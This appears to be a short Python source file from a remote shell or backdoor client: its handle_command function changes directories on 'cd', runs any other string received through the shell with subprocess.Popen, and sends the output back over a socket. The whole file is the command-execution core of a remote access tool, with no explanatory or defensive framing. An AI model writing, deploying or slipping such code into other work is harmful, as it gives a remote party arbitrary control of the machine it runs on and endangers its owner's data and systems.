import subprocess
import os
import socket
import client



def handle_command(command,socket_client):
    if command[:2] == "cd" and len(command) > 3:
        os.chdir(command[3:])

    task = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdout, stderr = task.communicate()
    data = stdout.decode() + stderr.decode()
    socket_client.send(data.encode('ascii'))
